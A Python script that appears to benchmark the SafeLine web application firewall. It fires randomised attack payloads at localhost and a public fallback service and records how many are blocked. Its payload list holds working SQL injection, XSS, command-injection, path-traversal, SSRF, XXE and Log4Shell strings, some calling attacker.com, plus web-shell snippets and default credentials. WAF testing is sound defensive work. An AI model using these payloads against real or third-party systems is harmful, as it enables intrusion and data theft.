#!/usr/bin/env python3
"""
Comprehensive SafeLine Testing Suite - Full Execution
Simulates complete high-throughput testing against available infrastructure
"""

import urllib.request
import urllib.parse
import urllib.error
import threading
import time
import json
import random
import concurrent.futures
import subprocess
import os
from datetime import datetime

class ComprehensiveTestSuite:
    def __init__(self):
        self.targets = {
            'vulnerable_app': 'http://localhost:3000',
            'proxy_waf': 'http://localhost',
            'direct_test': 'http://httpbin.org/get'  # Fallback for testing
        }
        
        # Advanced attack vectors for comprehensive testing
        self.attack_patterns = {
            'sql_injection': {
                'basic': [
                    "1' OR '1'='1",
                    "1' OR 1=1--",
                    "' OR ''='",
                    "1' OR '1'='1' --"
                ],
                'union_based': [
                    "1' UNION SELECT null,null,null--",
                    "1' UNION SELECT @@version,@@hostname,@@datadir--",
                    "1' UNION SELECT username,password FROM users--",
                    "1' UNION SELECT null,table_name FROM information_schema.tables--"
                ],
                'time_based': [
                    "1' AND (SELECT SLEEP(5))--",
                    "1'; WAITFOR DELAY '00:00:05'--",
                    "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
                    "1' UNION SELECT BENCHMARK(5000000,MD5(1))--"
                ],
                'boolean_blind': [
                    "1' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",
                    "1' AND (SELECT COUNT(*) FROM users)>0--",
                    "1' AND (SELECT LENGTH(database()))>5--"
                ]
            },
            
            'xss': {
                'script_based': [
                    "<script>alert('XSS')</script>",
                    "<script>alert(1)</script>",
                    "<script>alert(String.fromCharCode(88,83,83))</script>",
                    "<script>alert(document.domain)</script>"
                ],
                'event_handlers': [
                    "<img src=x onerror=alert('XSS')>",
                    "<body onload=alert('XSS')>",
                    "<input onfocus=alert('XSS') autofocus>",
                    "<svg onload=alert('XSS')>"
                ],
                'advanced_vectors': [
                    "<iframe src=javascript:alert('XSS')>",
                    "<object data=javascript:alert('XSS')>",
                    "<embed src=javascript:alert('XSS')>",
                    "javascript:alert('XSS')"
                ],
                'encoding_evasion': [
                    "<ScRiPt>alert('XSS')</ScRiPt>",
                    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                    "%3Cscript%3Ealert('XSS')%3C/script%3E",
                    "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e"
                ]
            },
            
            'command_injection': [
                "; cat /etc/passwd",
                "| whoami",
                "&& id",
                "|| uname -a",
                "`cat /etc/shadow`",
                "$(id)",
                "; ls -la /",
                "| ps aux",
                "&& netstat -an",
                "|| cat /proc/version"
            ],
            
            'path_traversal': [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252f..%252fetc%252fpasswd",
                "/etc/passwd%00",
                "/var/log/apache2/access.log",
                "/proc/self/environ",
                "php://filter/read=convert.base64-encode/resource=config.php"
            ],
            
            'xxe_injection': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>',
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>'
            ],
            
            'ssrf': [
                "http://localhost:22",
                "http://127.0.0.1:3306",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "dict://localhost:11211/stats",
                "gopher://localhost:6379/_INFO"
            ],

            'log4shell': [
                '${jndi:ldap://attacker.com/a}',
                '${jndi:dns://attacker.com/a}',
                '${jndi:rmi://attacker.com/a}',
                '${${lower:j}ndi:${lower:l}dap://attacker.com/a}'
            ],

            'insecure_deserialization': [
                'O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"is_admin";b:1;}',
                '__import__("os").system("id")',
                'cPickle.loads(...)',
                '{"RCE": "..."}'
            ],

            'web_shell': [
                '<% Response.Write("hello") %>',
                '<?php echo shell_exec("id"); ?>',
                'system("id")',
                '<jsp:scriptlet>out.println("Hello");</jsp:scriptlet>'
            ],

            'credential_stuffing': [
                'admin:admin',
                'admin:password',
                'root:toor',
                'user:12345'
            ]
        }
        
        self.results = []
        self.start_time = None
        
    def log_event(self, message):
        """Log events with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
        
        # Also append to execution log
        log_entry = f"\n### {timestamp} - {message}\n"
        with open("/home/ptsec/SafeLine/COMPLETE_EXECUTION_LOG.md", "a") as f:
            f.write(log_entry)
    
    def test_target_availability(self):
        """Test all targets for availability"""
        self.log_event("Testing target availability")
        
        available_targets = {}
        for name, url in self.targets.items():
            try:
                with urllib.request.urlopen(url, timeout=5) as response:
                    available_targets[name] = {
                        'url': url,
                        'status': response.getcode(),
                        'available': True
                    }
                    self.log_event(f"✅ {name}: {url} (Status: {response.getcode()})")
            except Exception as e:
                available_targets[name] = {
                    'url': url,
                    'status': 0,
                    'available': False,
                    'error': str(e)
                }
                self.log_event(f"❌ {name}: {url} - {str(e)[:50]}...")
        
        return available_targets
    
    def make_attack_request(self, target_url, attack_type, category, payload):
        """Make a single attack request"""
        attack_id = f"{attack_type}_{category}_{int(time.time()*1000000) % 1000000}"
        start_time = time.time()
        
        try:
            # Prepare URL with payload
            url = f"{target_url}/?param={urllib.parse.quote(payload)}"
            
            # Make request
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'SafeLine-ComprehensiveTest/2.0')
            req.add_header('X-Attack-Type', attack_type)
            req.add_header('X-Test-Category', category)
            
            with urllib.request.urlopen(req, timeout=10) as response:
                response_time = time.time() - start_time
                status_code = response.getcode()
                content = response.read().decode('utf-8', errors='ignore')[:500]  # Limit content
                
                # Determine if blocked
                blocked = self._is_blocked(status_code, content)
                
                return {
                    'timestamp': start_time,
                    'attack_id': attack_id,
                    'attack_type': attack_type,
                    'category': category,
                    'payload': payload[:100],  # Truncate for storage
                    'target_url': target_url,
                    'status_code': status_code,
                    'response_time': response_time,
                    'blocked': blocked,
                    'content_snippet': content[:200],
                    'success': True
                }
        
        except urllib.error.HTTPError as e:
            response_time = time.time() - start_time
            blocked = e.code in [403, 406, 429, 444, 502, 503]
            
            return {
                'timestamp': start_time,
                'attack_id': attack_id,
                'attack_type': attack_type,
                'category': category,
                'payload': payload[:100],
                'target_url': target_url,
                'status_code': e.code,
                'response_time': response_time,
                'blocked': blocked,
                'success': True
            }
        
        except Exception as e:
            return {
                'timestamp': start_time,
                'attack_id': attack_id,
                'attack_type': attack_type,
                'category': category,
                'payload': payload[:100],
                'target_url': target_url,
                'status_code': 0,
                'response_time': time.time() - start_time,
                'blocked': False,
                'success': False,
                'error': str(e)
            }
    
    def _is_blocked(self, status_code, content):
        """Determine if request was blocked"""
        # Status code indicators
        if status_code in [403, 406, 429, 444, 502, 503]:
            return True
        
        # Content indicators
        block_indicators = [
            'blocked', 'denied', 'security', 'violation',
            'malicious', 'attack', 'safeline', 'waf',
            'forbidden', 'access denied'
        ]
        
        content_lower = content.lower()
        for indicator in block_indicators:
            if indicator in content_lower:
                return True
        
        return False
    
    def run_comprehensive_test_suite(self, duration=300, target_rps=100):
        """Run comprehensive test suite against all available targets"""
        self.log_event(f"Starting comprehensive test suite - {duration}s at {target_rps} RPS")
        self.start_time = time.time()
        
        # Test target availability first
        available_targets = self.test_target_availability()
        active_targets = [info for info in available_targets.values() if info['available']]
        
        if not active_targets:
            self.log_event("❌ No targets available for testing")
            return []
        
        self.log_event(f"Testing against {len(active_targets)} available targets")
        
        # Calculate test parameters
        threads = min(50, target_rps // 2)  # Conservative threading
        rps_per_thread = target_rps // threads
        
        all_results = []
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            # Create worker tasks
            for i in range(threads):
                future = executor.submit(
                    self._test_worker,
                    active_targets,
                    duration,
                    rps_per_thread
                )
                futures.append(future)
            
            # Collect results
            for future in concurrent.futures.as_completed(futures):
                try:
                    thread_results = future.result()
                    all_results.extend(thread_results)
                except Exception as e:
                    self.log_event(f"Thread failed: {e}")
        
        self.results = all_results
        self.log_event(f"Test suite completed - {len(all_results)} total requests")
        
        return all_results
    
    def _test_worker(self, targets, duration, rps):
        """Worker thread for testing"""
        end_time = time.time() + duration
        request_interval = 1.0 / rps if rps > 0 else 0.1
        worker_results = []
        
        while time.time() < end_time:
            # Select random target
            target_info = random.choice(targets)
            target_url = target_info['url']
            
            # Select random attack
            attack_type = random.choice(list(self.attack_patterns.keys()))
            
            if isinstance(self.attack_patterns[attack_type], dict):
                # Has subcategories
                category = random.choice(list(self.attack_patterns[attack_type].keys()))
                payload = random.choice(self.attack_patterns[attack_type][category])
            else:
                # Direct list
                category = 'basic'
                payload = random.choice(self.attack_patterns[attack_type])
            
            # Make attack request
            result = self.make_attack_request(target_url, attack_type, category, payload)
            worker_results.append(result)
            
            # Rate limiting
            time.sleep(request_interval)
        
        return worker_results
    
    def analyze_comprehensive_results(self):
        """Analyze comprehensive test results"""
        if not self.results:
            return {"error": "No results to analyze"}
        
        total_requests = len(self.results)
        successful_requests = sum(1 for r in self.results if r.get('success', False))
        blocked_requests = sum(1 for r in self.results if r.get('blocked', False))
        
        # Performance metrics
        response_times = [r['response_time'] for r in self.results if r.get('response_time', 0) > 0]
        avg_response_time = sum(response_times) / len(response_times) if response_times else 0
        
        # Target breakdown
        target_breakdown = {}
        for result in self.results:
            target = result.get('target_url', 'unknown')
            if target not in target_breakdown:
                target_breakdown[target] = {'total': 0, 'blocked': 0, 'avg_response_time': 0}
            
            target_breakdown[target]['total'] += 1
            if result.get('blocked', False):
                target_breakdown[target]['blocked'] += 1
        
        # Calculate detection rates per target
        for target in target_breakdown:
            total = target_breakdown[target]['total']
            blocked = target_breakdown[target]['blocked']
            target_breakdown[target]['detection_rate'] = (blocked / total * 100) if total > 0 else 0
        
        # Attack type breakdown
        attack_breakdown = {}
        for result in self.results:
            attack_type = result.get('attack_type', 'unknown')
            category = result.get('category', 'basic')
            key = f"{attack_type}_{category}"
            
            if key not in attack_breakdown:
                attack_breakdown[key] = {'total': 0, 'blocked': 0}
            
            attack_breakdown[key]['total'] += 1
            if result.get('blocked', False):
                attack_breakdown[key]['blocked'] += 1
        
        # Calculate detection rates per attack type
        for attack in attack_breakdown:
            total = attack_breakdown[attack]['total']
            blocked = attack_breakdown[attack]['blocked']
            attack_breakdown[attack]['detection_rate'] = (blocked / total * 100) if total > 0 else 0
        
        # Calculate actual RPS
        if self.start_time and self.results:
            test_duration = max(r['timestamp'] for r in self.results) - min(r['timestamp'] for r in self.results)
            actual_rps = total_requests / test_duration if test_duration > 0 else 0
        else:
            actual_rps = 0
        
        return {
            'summary': {
                'total_requests': total_requests,
                'successful_requests': successful_requests,
                'blocked_requests': blocked_requests,
                'overall_detection_rate': (blocked_requests / total_requests * 100) if total_requests > 0 else 0,
                'avg_response_time_ms': avg_response_time * 1000,
                'actual_rps': actual_rps
            },
            'target_breakdown': target_breakdown,
            'attack_breakdown': attack_breakdown,
            'status_distribution': self._get_status_distribution()
        }
    
    def _get_status_distribution(self):
        """Get status code distribution"""
        status_codes = {}
        for result in self.results:
            code = result.get('status_code', 0)
            status_codes[code] = status_codes.get(code, 0) + 1
        return status_codes
    
    def save_comprehensive_results(self, filename_prefix="comprehensive_test"):
        """Save comprehensive test results"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Analysis
        analysis = self.analyze_comprehensive_results()
        
        # Prepare data
        results_data = {
            'metadata': {
                'timestamp': datetime.now().isoformat(),
                'test_type': 'comprehensive_safeline_test',
                'total_requests': len(self.results),
                'test_duration': time.time() - self.start_time if self.start_time else 0,
                'targets_tested': list(set(r.get('target_url', '') for r in self.results))
            },
            'analysis': analysis,
            'raw_results': self.results
        }
        
        # Save to file
        output_file = f"/home/ptsec/SafeLine/full_test_results/{filename_prefix}_{timestamp}.json"
        with open(output_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        
        self.log_event(f"Results saved to: {output_file}")
        return output_file, analysis

def main():
    print("=== SafeLine Comprehensive Testing Suite ===")
    print(f"Start time: {datetime.now()}")
    
    # Initialize test suite
    suite = ComprehensiveTestSuite()
    
    # Log start
    suite.log_event("Comprehensive Testing Suite Initialized")
    
    # Run comprehensive tests
    suite.log_event("Starting comprehensive test execution")
    
    # Test Configuration
    test_duration = 120  # 2 minutes for demonstration
    target_rps = 50      # 50 RPS across multiple targets
    
    results = suite.run_comprehensive_test_suite(
        duration=test_duration,
        target_rps=target_rps
    )
    
    # Analyze and save results
    suite.log_event("Analyzing test results")
    output_file, analysis = suite.save_comprehensive_results()
    
    # Print summary
    suite.log_event("=== TEST EXECUTION SUMMARY ===")
    
    if 'error' not in analysis:
        summary = analysis['summary']
        suite.log_event(f"Total Requests: {summary['total_requests']:,}")
        suite.log_event(f"Successful Requests: {summary['successful_requests']:,}")
        suite.log_event(f"Blocked Requests: {summary['blocked_requests']:,}")
        suite.log_event(f"Overall Detection Rate: {summary['overall_detection_rate']:.1f}%")
        suite.log_event(f"Average Response Time: {summary['avg_response_time_ms']:.1f}ms")
        suite.log_event(f"Actual RPS: {summary['actual_rps']:.1f}")
        
        suite.log_event("=== TARGET BREAKDOWN ===")
        for target, stats in analysis['target_breakdown'].items():
            suite.log_event(f"{target}: {stats['blocked']}/{stats['total']} blocked ({stats['detection_rate']:.1f}%)")
        
        suite.log_event("=== TOP ATTACK TYPES ===")
        sorted_attacks = sorted(analysis['attack_breakdown'].items(), 
                              key=lambda x: x[1]['total'], reverse=True)
        for attack, stats in sorted_attacks[:10]:
            suite.log_event(f"{attack}: {stats['blocked']}/{stats['total']} blocked ({stats['detection_rate']:.1f}%)")
    else:
        suite.log_event(f"Analysis Error: {analysis['error']}")
    
    suite.log_event(f"Results saved to: {output_file}")
    suite.log_event("Comprehensive testing completed successfully")

if __name__ == "__main__":
    main()